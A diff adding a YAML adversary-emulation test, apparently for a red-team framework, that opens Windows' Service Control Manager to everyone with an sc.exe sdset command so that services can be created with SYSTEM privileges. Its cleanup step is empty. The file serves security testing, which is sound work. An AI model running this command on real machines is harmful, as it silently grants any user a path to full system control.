@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: Modifying ACL of Service Control Manager via SDET
+description: "Modify permissions of Service Control Manager via SDSET. This allows any administrative user to escalate privilege and create a service with SYSTEM level privileges.Restart is required.\n[Blog](https://0xv1n.github.io/posts/scmanager/)  \n"
+uuid: bf07f520-3909-4ef5-aa22-877a50f2f77b
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1569: System Services'
+    subtechniques:
+        - 'T1569.002: Service Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: modifying-acl-of-service-control-manager-via-sdet
+      inline: |
+        sc.exe sdset scmanager D:(A;;KA;;;WD)
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
